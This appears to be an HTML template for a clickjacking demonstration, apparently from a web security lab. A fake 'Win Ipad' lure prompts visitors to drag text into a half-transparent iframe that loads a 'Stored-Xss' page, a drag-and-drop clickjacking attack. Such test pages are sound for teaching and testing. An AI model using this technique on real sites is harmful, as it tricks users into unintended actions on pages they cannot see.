<html>
<body>
<span draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'Testing Clickjacking');dragIt(this, event)"><h1>DRAG And Click On Win Now</h1></span>
<div style="position: absolute; left: 400px; top: 50px;">
    <img src="{{ URL::asset('img/ipad.jpg') }}">
    <div style="margin-left:-185px;">
    </div>
</div>
<div style="position: absolute; right: 1000px; top: 346px; color: red; font-weight: bold;">>> Drag Here <<</div>
<iframe ondragenter="return dragEnter(event)" ondrop="return dragDrop(event)" ondragover="return dragOver(event)" sandbox="allow-scripts allow-forms" src="{{ URL::asset('Stored-Xss') }}" style="width:100%;height:100%;opacity:0.5"></iframe>
<div style="position: absolute; right: 1200px; top: 546px; color: red; font-weight: bold;">>> Win Ipad <<</div>
</body>
</html>
